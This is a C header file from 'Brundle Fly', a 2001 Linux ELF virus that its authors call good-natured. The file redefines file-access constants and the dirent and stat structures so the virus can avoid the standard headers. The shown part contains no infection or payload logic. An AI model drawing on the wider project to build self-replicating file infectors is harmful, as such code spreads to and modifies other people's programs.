/*
 * Brundle Fly - Good-natured Linux ELF virus supporting kernel 2.2 and 2.4
 * Copyright 2001 Konrad Rieck <kr@roqe.org>, Konrad Kretschmer <kk@roqe.org>
 * In memory to Seth Brundle 
 *
 * Structures used in Brundle Fly. The virus code cannot include the default
 * linux headers that hold those structures, since those also include
 * several unwanted function definitons, etc...
 *
 * $Id: structs.h,v 1.10 2001/07/11 18:34:48 kr Exp $
 */

#define O_RDONLY	     00
#define O_WRONLY	     01
#define O_RDWR		     02
#define O_CREAT		   0100	/* not fcntl */

#define SEEK_SET       0	/* Seek from beginning of file.  */

/* Values for the second argument to access.
   These may be OR'd together.  */
#define R_OK    4		/* Test for read permission.  */
#define W_OK    2		/* Test for write permission.  */
#define X_OK    1		/* Test for execute permission.  */
#define F_OK    0		/* Test for existence.  */

struct dirent {
    long d_ino;
    int d_off;
    unsigned short d_reclen;
    char d_name[256];
};

struct stat {
    long st_dev;		/* device */
    long st_ino;		/* inode */
    short st_mode;		/* protection */
    short st_nlink;		/* number of hard links */
    short st_uid;		/* user ID of owner */
    short st_gid;		/* group ID of owner */
    short st_rdev;		/* device type (if inode de */
    long st_size;		/* total size, in bytes */
    unsigned long st_blksize;	/* blocksize for filesystem */
    unsigned long st_blocks;	/* number of blocks allocat */
    time_t st_atime;		/* time of last access */
    time_t st_mtime;		/* time of last modificatio */
    time_t st_ctime;		/* time of last change */
};
